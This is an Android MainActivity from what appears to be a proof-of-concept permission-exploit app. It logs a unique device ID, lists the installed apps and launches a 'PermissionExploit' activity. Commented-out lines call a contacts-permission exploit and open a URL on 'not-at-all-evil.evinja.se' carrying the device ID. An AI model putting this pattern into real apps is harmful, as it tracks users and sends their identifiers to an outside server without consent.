package se.evinja.lbs.lbsapp;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String uid = new UniqueID().getID(getApplicationContext());
        Log.i("GOT ID", uid);

        new InstalledApps().getInstalledApps(getApplicationContext());

        Intent i =  new Intent("se.evinja.lbs.PermissionExploit");
        startActivity(i);

//        new ExploitContactsPermission().startExploit(getApplicationContext());

        // Start web-browser
//        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://not-at-all-evil.evinja.se?id=" + uid));
//        startActivity(intent);

    }
}
